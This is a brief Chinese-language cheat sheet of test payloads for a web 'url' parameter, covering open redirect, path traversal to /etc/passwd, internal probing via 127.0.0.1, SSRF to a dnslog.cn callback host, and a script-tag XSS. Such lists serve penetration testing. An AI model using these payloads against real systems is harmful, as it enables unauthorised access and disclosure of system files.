## url 参数

#### URL 跳转

```
url=http://example.com
```

#### 任意文件读取

```
url=file///etc/passwd
filename=../../etc/passwd
```

#### 内网爆破

```
url=http://127.0.0.1
```

#### ssrf

```
url=http://dnslog.cn
```

#### xss

```
url=<script>console.log('hacker')</script>
```
